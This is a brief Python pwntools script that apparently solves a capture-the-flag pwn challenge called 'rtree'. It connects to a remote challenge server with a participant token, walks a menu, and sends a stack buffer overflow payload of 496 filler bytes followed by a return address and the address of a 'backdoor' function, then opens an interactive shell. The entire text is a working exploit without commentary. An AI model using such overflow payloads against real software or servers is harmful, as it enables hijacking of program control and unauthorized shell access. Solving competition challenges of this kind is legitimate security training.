from pwn import *

r = remote('prob12.geekgame.pku.edu.cn', 10012)
token = b"0:CrazyThursday-VME50"
r.sendline(token)

print(r.recv())
r.sendline(b"1")
print(r.recv())
r.sendline(b"1")
print(r.recv())
r.sendline(b"488")
print(r.recv())

elf = ELF("./rtree")
addr = elf.symbols["backdoor"]
ret = elf.symbols['main']+0xA7

payload = b"x" * 496 + ret.to_bytes(length=8, byteorder='little') + addr.to_bytes(length=8, byteorder='little')

r.sendline(payload)
print(r.recv())
r.sendline(b"4")
print(r.recv())

r.interactive()